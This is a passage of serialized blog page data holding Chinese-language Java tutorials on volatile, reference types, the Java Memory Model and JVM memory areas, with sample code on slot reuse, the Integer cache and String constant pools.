内存模型是通过在变量修改后将新值同步回主内存，在变量读取前从主内存刷新变量值的这种依赖主内存作为传递媒介的方式来实现的。\n\njava 中的 volatile 关键字提供了一个功能，那就是被其修饰的变量在被修改后可以立即同步到主内存，被其修饰的变量在每次是用之前都从主内存刷新。因此，可以使用 volatile 来保证多线程操作时变量的可见性。\n\n除了 volatile，java 中的 synchronized 和 final 两个关键字也可以实现可见性。只不过实现方式不同，这里不再展开了。\n\n * 有序性\n\n在 java 中，可以使用 synchronized 和 volatile 来保证多线程之间操作的有序性。实现方式有所区别：\n\n> volatile 关键字会禁止指令重排。synchronized 关键字保证同一时刻只允许一条线程操作。\n\n好了，这里简单的介绍完了 java 并发编程中解决原子性、可见性以及有序性可以使用的关键字。读者可能发现了，好像 synchronized 关键字是万 能的，他可以同时满足以上三种特性，这其实也是很多人滥用 synchronized 的原因。\n\n但是 synchronized 是比较影响性能的，虽然编译器提供了很多锁优化技术，但是也不建议过度使用。",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"java强引用、弱引用、软引用、虚引用",frontmatter:{title:"java强引用、弱引用、软引用、虚引用",date:"2022-04-17T22:21:46.000Z",permalink:"/pages/4be2cf/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/05.jvm/10.java%E5%BC%BA%E5%BC%95%E7%94%A8%E3%80%81%E5%BC%B1%E5%BC%95%E7%94%A8%E3%80%81%E8%BD%AF%E5%BC%95%E7%94%A8%E3%80%81%E8%99%9A%E5%BC%95%E7%94%A8.html",relativePath:"04.java/05.jvm/10.java强引用、弱引用、软引用、虚引用.md",key:"v-3b19137e",path:"/pages/4be2cf/",headersStr:null,content:'前言： 万能的程序猿可以指定哪些不是垃圾不能被回收，哪些是普通的垃圾可以晚点回收，哪些是超级垃圾需立马被回收…\n\n\n# 强引用\n\n解释： 我们日常用 “=” 号 直接赋值的对象大都属于强引用，它被认为是必须用到的对象，哪怕是抛出OOM，GC也不会回收。\n\n( 如何中断强引用？ 直接赋值为 null 即可，这时GC会认为对象无引用，可直接回收 )\n\n----------------------------------------\n\n> 注意弱引用、软引用、虚引用和强引用的直接区别就是对象都要被一个Reference类包裹。\n\n\n# 软引用\n\n举例：\n\nSoftReference sr = new SoftReference<String>(new String("hello"));\n\n\n1\n\n\n解释： 被标为软引用的对象被认为是有用但不一定需要立马被回收的对象，在发生GC时除非内存不够才会被回收，否则不会。\n\n用例： 做一些小的缓存，比如网页浏览的上一页内容缓存进去，如果有人请求上一页，在内存足够的情况下直接返回内容，反之被可能因内存不够被回收掉了，重新获取内容即可。灵活的缓存，减少了OOM几率。\n\n\n# 弱引用\n\n举例：\n\nWeakReference wr = new WeakReference<String>(new String("hello"));\n\n\n1\n\n\n解释： 被标为弱引用的对象被认为是非必须对象，在发生GC时会被毫不留情的直接回收。\n\n用例： 因为GC不会时刻发生，弱引用也不是说new出来会被立马回收，所以也可以和软引用一样做缓存之类的事。\n\n\n# 虚引用\n\n举例：\n\nPhantomReference pr \n     = new PhantomReference<String>(new String("hello"),new ReferenceQueue<>());\n\n\n1\n2\n\n\n解释： 虚引用必须搭配ReferenceQueue使用，被标为虚引用的对象，在发生GC时会被放进队列，然后回收。\n\n用例： 和上面说的几个引用比，没发现有什么特别用处，你可以用来记录跟踪对象被垃圾回收的活动。有人形容虚引用为 —— “死亡证明，一般活人是根本不用的，只有人挂了的时候，去火葬场才能查到是哪个人挂了”\n\n\n# 总结\n\n表格概览：\n\n引用类型   被回收时间      用途        生存时间\n强引用    从来不会       对象的一般状态   JVM停止运行时\n软引用    内存不足时      对象缓存      内存不足时\n弱引用    jvm垃圾回收时   对象缓存      gc运行后\n虚引用    未知         未知        未知',normalizedContent:'前言： 万能的程序猿可以指定哪些不是垃圾不能被回收，哪些是普通的垃圾可以晚点回收，哪些是超级垃圾需立马被回收…\n\n\n# 强引用\n\n解释： 我们日常用 “=” 号 直接赋值的对象大都属于强引用，它被认为是必须用到的对象，哪怕是抛出oom，gc也不会回收。\n\n( 如何中断强引用？ 直接赋值为 null 即可，这时gc会认为对象无引用，可直接回收 )\n\n----------------------------------------\n\n> 注意弱引用、软引用、虚引用和强引用的直接区别就是对象都要被一个reference类包裹。\n\n\n# 软引用\n\n举例：\n\nsoftreference sr = new softreference<string>(new string("hello"));\n\n\n1\n\n\n解释： 被标为软引用的对象被认为是有用但不一定需要立马被回收的对象，在发生gc时除非内存不够才会被回收，否则不会。\n\n用例： 做一些小的缓存，比如网页浏览的上一页内容缓存进去，如果有人请求上一页，在内存足够的情况下直接返回内容，反之被可能因内存不够被回收掉了，重新获取内容即可。灵活的缓存，减少了oom几率。\n\n\n# 弱引用\n\n举例：\n\nweakreference wr = new weakreference<string>(new string("hello"));\n\n\n1\n\n\n解释： 被标为弱引用的对象被认为是非必须对象，在发生gc时会被毫不留情的直接回收。\n\n用例： 因为gc不会时刻发生，弱引用也不是说new出来会被立马回收，所以也可以和软引用一样做缓存之类的事。\n\n\n# 虚引用\n\n举例：\n\nphantomreference pr \n     = new phantomreference<string>(new string("hello"),new referencequeue<>());\n\n\n1\n2\n\n\n解释： 虚引用必须搭配referencequeue使用，被标为虚引用的对象，在发生gc时会被放进队列，然后回收。\n\n用例： 和上面说的几个引用比，没发现有什么特别用处，你可以用来记录跟踪对象被垃圾回收的活动。有人形容虚引用为 —— “死亡证明，一般活人是根本不用的，只有人挂了的时候，去火葬场才能查到是哪个人挂了”\n\n\n# 总结\n\n表格概览：\n\n引用类型   被回收时间      用途        生存时间\n强引用    从来不会       对象的一般状态   jvm停止运行时\n软引用    内存不足时      对象缓存      内存不足时\n弱引用    jvm垃圾回收时   对象缓存      gc运行后\n虚引用    未知         未知        未知',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"JMM：Java内存模型",frontmatter:{title:"JMM：Java内存模型",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/a6fc4c/",categories:["java","jvm"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/05.jvm/11.JMM%EF%BC%9AJava%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B.html",relativePath:"04.java/05.jvm/11.JMM：Java内存模型.md",key:"v-722d0e08",path:"/pages/a6fc4c/",headers:[{level:2,title:"JMM有以下规定：",slug:"jmm有以下规定",normalizedTitle:"jmm有以下规定：",charIndex:91},{level:2,title:"本地内存和主内存的关系：",slug:"本地内存和主内存的关系",normalizedTitle:"本地内存和主内存的关系：",charIndex:320}],headersStr:"JMM有以下规定： 本地内存和主内存的关系：",content:"Java内存模型(JavaMemoryModel)描述了Java程序中各种变量(线程共享变量)的访问规则，以及在JVM中将变量，存储到内存和从内存中读取变量这样的底层细节。\n\n\n# JMM有以下规定：\n\n 1. 所有的共享变量都存储于主内存，这里所说的变量指的是实例变量和类变量，不包含局部变量，因为局部变量是线程私有的，因此不存在竞争问题。\n\n 2. 每一个线程还存在自己的工作内存，线程的工作内存，保留了被线程使用的变量的工作副本。 线程对变量的所有的操作(读，取)都必须在工作内存中完成，而不能直接读写主内存中的变量。\n\n 3. 不同线程之间也不能直接访问对方工作内存中的变量，线程间变量的值的传递需要通过主内存中转来完成。\n\n\n# 本地内存和主内存的关系：\n\n",normalizedContent:"java内存模型(javamemorymodel)描述了java程序中各种变量(线程共享变量)的访问规则，以及在jvm中将变量，存储到内存和从内存中读取变量这样的底层细节。\n\n\n# jmm有以下规定：\n\n 1. 所有的共享变量都存储于主内存，这里所说的变量指的是实例变量和类变量，不包含局部变量，因为局部变量是线程私有的，因此不存在竞争问题。\n\n 2. 每一个线程还存在自己的工作内存，线程的工作内存，保留了被线程使用的变量的工作副本。 线程对变量的所有的操作(读，取)都必须在工作内存中完成，而不能直接读写主内存中的变量。\n\n 3. 不同线程之间也不能直接访问对方工作内存中的变量，线程间变量的值的传递需要通过主内存中转来完成。\n\n\n# 本地内存和主内存的关系：\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"JVM内存结构",frontmatter:{title:"JVM内存结构",date:"2022-04-17T22:22:39.000Z",permalink:"/pages/016c1e/",categories:["java"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/05.jvm/12.JVM%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84.html",relativePath:"04.java/05.jvm/12.JVM内存结构.md",key:"v-28f2daf7",path:"/pages/016c1e/",headers:[{level:2,title:"2.1 局部变量表",slug:"_2-1-局部变量表",normalizedTitle:"2.1 局部变量表",charIndex:1262},{level:2,title:"2.2 操作数栈",slug:"_2-2-操作数栈",normalizedTitle:"2.2 操作数栈",charIndex:3810}],headersStr:"2.1 局部变量表 2.2 操作数栈",content:'Java 虚拟机在执行 Java 程序的过程中会把它管理的内存划分为若干个不同的数据区域。每个区域都有各自的作用。\n\n分析 JVM 内存结构，主要就是分析 JVM 运行时数据存储区域。JVM 的运行时数据区主要包括：堆、栈、方法区、程序计数器等。而 JVM 的优化问题主要在线程共享的数据区中：堆、方法区。\n\n\n\n\n# 1. 程序计数器\n\n程序计数器（Program Counter Register）是一块较小的内存空间，可以看作是当前线程所执行字节码的行号指示器，指向下一个将要执行的指令代码，由执行引擎来读取下一条指令。更确切的说，一个线程的执行，是通过字节码解释器改变当前线程的计数器的值，来获取下一条需要执行的字节码指令，从而确保线程的正确执行。\n\n为了确保线程切换后（上下文切换）能恢复到正确的执行位置，每个线程都有一个独立的程序计数器，各个线程的计数器互不影响，独立存储。也就是说程序计数器是线程私有的内存。\n\n如果线程执行 Java 方法，这个计数器记录的是正在执行的虚拟机字节码指令的地址；如果执行的是 Native 方法，计数器值为Undefined。\n\n程序计数器不会发生内存溢出（OutOfMemoryError即OOM）问题。\n\n\n# 2. 栈\n\nJVM 中的栈包括 Java 虚拟机栈和本地方法栈，两者的区别就是，Java 虚拟机栈为 JVM 执行 Java 方法服务，本地方法栈则为 JVM 使用到的 Native 方法服务。两者作用是极其相似的，本文主要介绍 Java 虚拟机栈，以下简称栈。\n\n> Native 方法是什么？\n\nJDK 中有很多方法是使用 Native 修饰的。Native 方法不是以 Java 语言实现的，而是以本地语言实现的（比如 C 或 C++）。个人理解Native 方法是与操作系统直接交互的。比如通知垃圾收集器进行垃圾回收的代码 System.gc()，就是使用 native 修饰的。\n\npublic final class System {\n    public static void gc() {\n        Runtime.getRuntime().gc();\n    }\n}\n \npublic class Runtime {\n    //使用native修饰\n     public native void gc();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n> 什么是栈？\n\n定义：限定仅在表头进行插入和删除操作的线性表。即压栈（入栈）和弹栈（出栈）都是对栈顶元素进行操作的。所以栈是后进先出的。\n\n栈是线程私有的，他的生命周期与线程相同。每个线程都会分配一个栈的空间，即每个线程拥有独立的栈空间。\n\n\n\n> 栈中存储的是什么？\n\n栈帧是栈的元素。每个方法在执行时都会创建一个栈帧。栈帧中存储了局部变量表、操作数栈、动态连接和方法出口等信息。每个方法从调用到运行结束的过程，就对应着一个栈帧在栈中压栈到出栈的过程。\n\n\n\n\n# 2.1 局部变量表\n\n栈帧中，由一个局部变量表存储数据。局部变量表中存储了基本数据类型（boolean、byte、char、short、int、float、long、double）的局部变量（包括参数）、和对象的引用（String、数组、对象等），但是不存储对象的内容。局部变量表所需的内存空间在编译期间完成分配，在方法运行期间不会改变局部变量表的大小。\n\n局部变量的容量以**变量槽（Variable Slot）**为最小单位，每个变量槽最大存储32位的数据类型。对于64位的数据类型（long、double），JVM 会为其分配两个连续的变量槽来存储。以下简称 Slot 。\n\nJVM 通过索引定位的方式使用局部变量表，索引的范围从0开始至局部变量表中最大的 Slot 数量。普通方法与 static 方法在第 0 个槽位的存储有所不同。非 static 方法的第 0 个槽位存储方法所属对象实例的引用。\n\n\n\n> Slot 复用？\n\n为了尽可能的节省栈帧空间，局部变量表中的 Slot 是可以复用的。方法中定义的局部变量，其作用域不一定会覆盖整个方法。当方法运行时，如果已经超出了某个变量的作用域，即变量失效了，那这个变量对应的 Slot 就可以交给其他变量使用，也就是所谓的 Slot 复用。通过一个例子来理解变量“失效”。\n\npublic void test(boolean flag)\n{\n    if(flag)\n    {\n        int a = 66;\n    }\n    \n    int b = 55;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n当虚拟机运行 test 方法，就会创建一个栈帧，并压入到当前线程的栈中。当运行到 int a = 66时，在当前栈帧的局部变量中创建一个 Slot 存储变量 a，当运行到 int b = 55时，此时已经超出变量 a 的作用域了（变量 a 的作用域在{}所包含的代码块中），此时 a 就失效了，变量a 占用的 Slot 就可以交给b来使用，这就是 Slot 复用。\n\n凡事有利弊。Slot 复用虽然节省了栈帧空间，但是会伴随一些额外的副作用。比如，Slot 的复用会直接影响到系统的垃圾收集行为。\n\npublic class TestDemo {\n \n    public static void main(String[] args){\n        \n        byte[] placeholder = new byte[64 * 1024 * 1024];\n        \n        System.gc();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n上段代码很简单，先向内存中填充了 64M 的数据，然后通知虚拟机进行垃圾回收。为了更清晰的查看垃圾回收的过程，我们再虚拟机的运行参数中加上“-verbose:gc”,这个参数的作用就是打印 GC 信息。\n\n\n\n打印的GC信息如下：\n\n\n\n可以看到虚拟机没有回收这 64M 内存。为什么没有被回收？其实很好理解，当执行 System.gc() 方法时，变量 placeholder 还在作用域范围之内，虚拟机是不会回收的，它还是“有效”的。\n\n我们对上面的代码稍作修改，使其作用域“失效”。\n\npublic class TestDemo {\n \n    public static void main(String[] args){\n        {\n            byte[] placeholder = new byte[64 * 1024 * 1024];\n        }\n        System.gc();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n当运行到 System.gc() 方法时，变量 placeholder 的作用域已经失效了。它已经“无用”了，虚拟机会回收它所占用的内存了吧？\n\n运行结果：\n\n\n\n发现虚拟机还是没有回收 placeholder 变量占用的 64M 内存。为什么所想非所见呢？在解释之前，我们再对代码稍作修改。在System.gc()方法执行之前，加入一个局部变量。\n\npublic class TestDemo {\n \n    public static void main(String[] args){\n        {\n            byte[] placeholder = new byte[64 * 1024 * 1024];\n        }\n        int a = 0;\n        System.gc();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n在 System.gc() 方法之前，加入 int a = 0，再执行方法，查看垃圾回收情况。\n\n\n\n发现 placeholder 变量占用的64M内存空间被回收了，如果不理解局部变量表的Slot复用，很难理解这种现象的。\n\n而 placeholder 变量能否被回收的关键就在于：局部变量表中的 Slot 是否还存有关于 placeholder 对象的引用。\n\n第一次修改中，限定了 placeholder 的作用域，但之后并没有任何对局部变量表的读写操作，placeholder 变量在局部变量表中占用的Slot没有被其它变量所复用，所以作为 GC Roots 一部分的局部变量表仍然保持着对它的关联。所以 placeholder 变量没有被回收。\n\n第二次修改后，运行到 int a = 0 时，已经超过了 placeholder 变量的作用域，此时 placeholder 在局部变量表中占用的Slot可以交给其他变量使用。而变量a正好复用了 placeholder 占用的 Slot，至此局部变量表中的 Slot 已经没有 placeholder 的引用了，虚拟机就回收了placeholder 占用的 64M 内存空间。\n\n----------------------------------------\n\n\n# 2.2 操作数栈\n\n操作数栈是一个后进先出栈。操作数栈的元素可以是任意的Java数据类型。方法刚开始执行时，操作数栈是空的，在方法执行过程中，通过字节码指令对操作数栈进行压栈和出栈的操作。通常进行算数运算的时候是通过操作数栈来进行的**，又或者是在调用其他方法的时候通过操作数栈进行参数传递****。操作数栈可以理解为栈帧中用于计算的临时数据存储区**。\n\n通过一段代码来了解操作数栈。\n\npublic class OperandStack{\n \n    public static int add(int a, int b){\n        int c = a + b;\n        return c;\n    }\n \n    public static void main(String[] args){\n        add(100, 98);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n使用 javap **反编译 **OperandStack 后，根据虚拟机指令集，得出操作数栈的运行流程如下：\n\n\n\nadd 方法刚开始执行时，操作数栈是空的。当执行 iload_0 时，把局部变量 0 压栈，即 100 入操作数栈。然后执行 iload_1，把局部变量1压栈，即 98 入操作数栈。接着执行 iadd，弹出两个变量（100 和 98 出操作数栈），对 100 和 98 进行求和，然后将结果 198 压栈。然后执行 istore_2，弹出结果（出栈）。\n\n下面通过一张图，对比执行100+98操作，局部变量表和操作数栈的变化情况。\n\n\n\n> 栈中可能出现哪些异常？\n\nStackOverflowError：栈溢出错误\n\n如果一个线程在计算时所需要用到栈大小 > 配置允许最大的栈大小，那么Java虚拟机将抛出 StackOverflowError\n\nOutOfMemoryError：内存不足\n\n栈进行动态扩展时如果无法申请到足够内存，会抛出 OutOfMemoryError 异常。\n\n> 如何设置栈参数？\n\n使用 -Xss 设置栈大小，通常几百K就够用了。由于栈是线程私有的，线程数越多，占用栈空间越大。\n\n栈决定了函数调用的深度。这也是慎用递归调用的原因。递归调用时，每次调用方法都会创建栈帧并压栈。当调用一定次数之后，所需栈的大小已经超过了虚拟机运行配置的最大栈参数，就会抛出 StackOverflowError 异常。\n\n\n# 3. Java堆\n\n堆是Java虚拟机所管理的内存中最大的一块存储区域。堆内存被所有线程共享。主要存放使用new关键字创建的对象。所有对象实例以及数组都要在堆上分配。垃圾收集器就是根据GC算法，收集堆上对象所占用的内存空间（收集的是对象占用的空间而不是对象本身）。\n\nJava堆分为年轻代（Young Generation）和老年代（Old Generation）；年轻代又分为伊甸园（Eden）和幸存区（Survivor区）；幸存区又分为From Survivor空间和 To Survivor空间。\n\n年轻代存储“新生对象”，我们新创建的对象存储在年轻代中。当年轻内存占满后，会触发Minor GC，清理年轻代内存空间。\n\n老年代存储长期存活的对象和大对象。年轻代中存储的对象，经过多次GC后仍然存活的对象会移动到老年代中进行存储。老年代空间占满后，会触发Full GC。\n\n注：Full GC是清理整个堆空间，包括年轻代和老年代。如果Full GC之后，堆中仍然无法存储对象，就会抛出OutOfMemoryError异常。\n\n\n\n> Java堆设置常用参数\n\n参数                                描述\n-Xms                              堆内存初始大小\n-Xmx（MaxHeapSize）                 堆内存最大允许大小，一般不要大于物理内存的80%\n-XX:NewSize（-Xns）                 年轻代内存初始大小\n-XX:MaxNewSize（-Xmn）              年轻代内存最大允许大小，也可以缩写\n-XX:NewRatio                      新生代和老年代的比值\n                                  \n                                  值为4 表示 新生代:老年代=1:4，即年轻代占堆的1/5\n-XX:SurvivorRatio=8               年轻代中Eden区与Survivor区的容量比例值，默认为8\n                                  \n                                  表示两个Survivor :eden=2:8，即一个Survivor占年轻代的1/10\n-XX:+HeapDumpOnOutOfMemoryError   内存溢出时，导出堆信息到文件\n-XX:+HeapDumpPath                 堆Dump路径\n                                  \n                                  -Xmx20m -Xms5m\n                                  \n                                  -XX:+HeapDumpOnOutOfMemoryError\n                                  \n                                  -XX:HeapDumpPath=d:/a.dump\n-XX:OnOutOfMemoryError            当发生OOM内存溢出时，执行一个脚本\n                                  \n                                  -XX:OnOutOfMemoryError=D:/tools/jdk1.7_40/bin/printstack.bat\n                                  %p\n                                  \n                                  %p表示线程的id pid\n-XX:MaxTenuringThreshold=7        表示如果在幸存区移动多少次没有被垃圾回收，进入老年代\n\n\n# 4. 方法区（Method Area）\n\n方法区同 Java 堆一样是被所有线程共享的区间，用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码。更具体的说，静态变量+常量+类信息（版本、方法、字段等）+运行时常量池存在方法区中。常量池是方法区的一部分。\n\n\n\n注：JDK1.8 使用元空间 **MetaSpace **替代方法区，元空间并不在 JVM中，而是使用本地内存。元空间两个参数：\n\n 1. MetaSpaceSize：初始化元空间大小，控制发生GC阈值\n 2. MaxMetaspaceSize ： 限制元空间大小上限，防止异常占用过多物理内存\n\n常量池中存储编译器生成的各种字面量和符号引用。字面量就是Java中常量的意思。比如文本字符串，final修饰的常量等。方法引用则包括类和接口的全限定名，方法名和描述符，字段名和描述符等。\n\n\n\n> 常量池有什么用 ？\n\n**优点：**常量池避免了频繁的创建和销毁对象而影响系统性能，其实现了对象的共享。\n\n举个栗子： Integer 常量池（缓存池），和字符串常量池\n\n> Integer常量池：\n\n我们知道 == 基本数据类型比较的是数值，而引用数据类型比较的是内存地址。\n\npublic void TestIntegerCache()\n{\n    public static void main(String[] args)\n    {\n        \n        Integer i1 = new Integer(66);\n        Integer i2 = new integer(66);\n        Integer i3 = 66;\n        Integer i4 = 66;\n        Integer i5 = 150;\n        Integer i6 = 150;\n        System.out.println(i1 == i2);//false\n        System.out.println(i3 == i4);//true\n        System.out.println(i5 == i6);//false\n    }\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\ni1 和 i2 使用 new 关键字，每 new 一次都会在堆上创建一个对象，所以 i1 == i2 为 false。\n\ni3 == i4 为什么是 true 呢？Integer i3 = 66 实际上有一步装箱的操作，即将 int 型的 66 装箱成 Integer，通过 Integer 的 valueOf 方法。\n\npublic static Integer valueOf(int i) {\n    if (i >= IntegerCache.low && i <= IntegerCache.high){\n    \treturn IntegerCache.cache[i + (-IntegerCache.low)];\n    }\n    return new Integer(i);\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nInteger 的 valueOf 方法很简单，它判断变量是否在 **IntegerCache **的最小值（-128）和最大值（127）之间，如果在，则返回常量池中的内容，否则 new 一个 Integer 对象。\n\n而 **IntegerCache **是 Integer的静态内部类，作用就是将 [-128,127] 之间的数“缓存”在 IntegerCache 类的 cache 数组中，valueOf 方法就是调用常量池的 cache 数组，不过是将 i3、i4 变量引用指向常量池中，没有真正的创建对象。而new Integer(i)则是直接在堆中创建对象。\n\nIntegerCache 类中，包含一个构造方法，三个静态变量：low最小值、high最大值、和Integer数组，还有一个静态代码块。静态代码块的作用就是在 IntegerCache 类加载的时候，对high最大值以及 Integer 数组初始化。也就是说当 IntegerCache 类加载的时候，最大最小值，和 Integer 数组就已经初始化好了。这个 Integer 数组其实就是包含了 -128到127之间的所有值。\n\n> IntegerCache 源码\n\nprivate static class IntegerCache {\n        static final int low = -128;//最小值\n        static final int high;//最大值\n        static final Integer cache[];//缓存数组\n \n        //私有化构造方法，不让别人创建它。单例模式的思想\n        private IntegerCache() {}\n \n        //类加载的时候，执行静态代码块。作用是将-128到127之间的数缓冲在cache[]数组中\n        static {\n            // high value may be configured by property\n            int h = 127;\n            String integerCacheHighPropValue =\n                sun.misc.VM.getSavedProperty("java.lang.Integer.IntegerCache.high");\n            if (integerCacheHighPropValue != null) {\n                try {\n                    int i = parseInt(integerCacheHighPropValue);\n                    i = Math.max(i, 127);\n                    // Maximum array size is Integer.MAX_VALUE\n                    h = Math.min(i, Integer.MAX_VALUE - (-low) -1);\n                } catch( NumberFormatException nfe) {\n                    // If the property cannot be parsed into an int, ignore it.\n                }\n            }\n            high = h;\n \n            cache = new Integer[(high - low) + 1];//初始化cache数组，根据最大最小值确定\n            int j = low;\n            for(int k = 0; k < cache.length; k++)//遍历将数据放入cache数组中\n                cache[k] = new Integer(j++);\n \n            // range [-128, 127] must be interned (JLS7 5.1.7)\n            assert IntegerCache.high >= 127;\n        }\n \n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n而 i5 == i6 为 false，就是因为 **150 不在 Integer 常量池的最大最小值之间【-128,127】，从而 new 了一个对象，**所以为 false。\n\n再看一段拆箱的代码。\n\npublic static void main(String[] args){\n       Integer i1 = new Integer(4);\n       Integer i2 = new Integer(6);\n       Integer i3 = new Integer(10);\n       System.out.print(i3 == i1+i2);//true\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n由于 i1 和 i2 是 Integer 对象，是不能使用+运算符的。首先 i1 和 i2 进行自动拆箱操作，拆箱成int后再进行数值加法运算。i3 也是拆箱后再与之比较数值是否相等的。所以 i3 == i1+i2 其实是比较的 int 型数值是否相等，所以为true。\n\n----------------------------------------\n\n> String常量池：\n\nString 是由 final 修饰的类，是不可以被继承的。通常有两种方式来创建对象。\n\nString str = new String("abcd");\nString str = "abcd";\n\n\n1\n2\n\n\n第一种使用 new 创建的对象，存放在堆中。每次调用都会创建一个新的对象。\n\n第二种先在栈上创建一个 String 类的对象引用变量 str，然后通过符号引用去字符串常量池中找有没有 “abcd”，如果没有，则将“abcd”存放到字符串常量池中，并将栈上的 str 变量引用指向常量池中的“abcd”。如果常量池中已经有“abcd”了，则不会再常量池中创建“abcd”，而是直接将 str 引用指向常量池中的“abcd”。\n\n对于 String 类，equals 方法用于比较字符串内容是否相同； == 号用于比较内存地址是否相同，即是否指向同一个对象。通过代码验证上面理论。\n\npublic static void main(String[] args){\n    String str1 = "abcd";\n    String str2 = "abcd";\n\tSystem.out.print(str1 == str2);\n}\n    \n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n首先在栈上存放变量引用 str1，然后通过符号引用去常量池中找是否有 abcd，没有，则将 abcd 存储在常量池中，然后将 str1 指向常量池的 abcd。当创建 str2 对象，去常量池中发现已经有 abcd 了，就将 str2 引用直接指向 abcd 。所以str1 == str2，指向同一个内存地址。\n\npublic static void main(String[] args){\n    String str1 = new String("abcd");\n    String str2 = new String("abcd");\n    System.out.print(str1 == str2);\n}\n\n\n1\n2\n3\n4\n5\n\n\nstr1 和 str2 使用 new 创建对象，分别在堆上创建了不同的对象。两个引用指向堆中两个不同的对象，所以为 false。\n\n> 关于字符串 + 号连接问题：\n\n对于字符串常量的 + 号连接，在程序编译期，JVM就会将其优化为 + 号连接后的值。所以在编译期其字符串常量的值就确定了。\n\nString a = "a1";   \nString b = "a" + 1;   \nSystem.out.println((a == b)); //result = true  \n \nString a = "atrue";   \nString b = "a" + "true";   \nSystem.out.println((a == b)); //result = true \n \nString a = "a3.4";   \nString b = "a" + 3.4;   \nSystem.out.println((a == b)); //result = true \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n> 关于字符串引用 + 号连接问题：\n\n对于字符串引用的 + 号连接问题，由于字符串引用在编译期是无法确定下来的，在程序的运行期动态分配并创建新的地址存储对象。\n\npublic static void main(String[] args){\n       String str1 = "a";\n\t   String str2 = "ab";\n\t   String str3 = str1 + "b";\n\t   System.out.print(str2 == str3);//false\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n对于上边代码，str3 等于 str1 引用 + 字符串常量“b”，在编译期无法确定，在运行期动态的分配并将连接后的新地址赋给 str3，所以 str2 和 str3 引用的内存地址不同，所以 str2 == str3 结果为 false\n\n通过 jad 反编译工具，分析上述代码到底做了什么。编译指令如下：\n\n\n\n经过 jad 反编译工具反编译代码后，代码如下\n\npublic class TestDemo\n{\n \n    public TestDemo()\n    {\n    }\n \n    public static void main(String args[])\n    {\n        String s = "a";\n        String s1 = "ab";\n        String s2 = (new StringBuilder()).append(s).append("b").toString();\n        System.out.print(s1 = s2);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n发现 new 了一个 StringBuilder 对象，然后使用 append 方法优化了 + 操作符。new 在堆上创建对象，而 String s1=“ab”则是在常量池中创建对象，两个应用所指向的内存地址是不同的，所以 s1 == s2 结果为 false。\n\n注：我们已经知道了字符串引用的 + 号连接问题，其实是在运行期间创建一个 StringBuilder 对象，使用其 append 方法将字符串连接起来。这个也是我们开发中需要注意的一个问题，就是尽量不要在 for 循环中使用 + 号来操作字符串。看下面一段代码：\n\npublic static void main(String[] args){\n        String s = null;\n        for(int i = 0; i < 100; i++){\n            s = s + "a";\n        }\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n在 for 循环中使用 + 连接字符串，每循环一次，就会新建 StringBuilder 对象，append 后就“抛弃”了它。如果我们在循环外创建StringBuilder 对象，然后在循环中使用 append 方法追加字符串，就可以节省 n-1 次创建和销毁对象的时间。所以在循环中连接字符串，一般使用 StringBuilder 或者 StringBuffer，而不是使用 + 号操作。\n\npublic static void main(String[] args){\n        StringBuilder s = new StringBuilder();\n        for(int i = 0; i < 100; i++){\n            s.append("a");\n        }\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n> 使用final修饰的字符串\n\npublic static void main(String[] args){\n        final String str1 = "a";\n        String str2 = "ab";\n        String str3 = str1 + "b";\n        System.out.print(str2 == str3);//true\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nfinal 修饰的变量是一个常量，编译期就能确定其值。所以 str1 + "b"就等同于 "a" + "b"，所以结果是 true。\n\n> String对象的intern方法。\n\npublic static void main(String[] args){\n        String s = "ab";\n        String s1 = "a";\n        String s2 = "b";\n        String s3 = s1 + s2;\n        System.out.println(s3 == s);//false\n        System.out.println(s3.intern() == s);//true\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n通过前面学习我们知道，s1+s2 实际上在堆上 new 了一个 StringBuilder 对象，而 s 在常量池中创建对象 “ab”，所以 s3 == s 为 false。但是 s3 调用 intern 方法，返回的是s3的内容（ab）在常量池中的地址值。所以 s3.intern() == s 结果为 true。',normalizedContent:'java 虚拟机在执行 java 程序的过程中会把它管理的内存划分为若干个不同的数据区域。每个区域都有各自的作用。\n\n分析 jvm 内存结构，主要就是分析 jvm 运行时数据存储区域。jvm 的运行时数据区主要包括：堆、栈、方法区、程序计数器等。而 jvm 的优化问题主要在线程共享的数据区中：堆、方法区。\n\n\n\n\n# 1. 程序计数器\n\n程序计数器（program counter 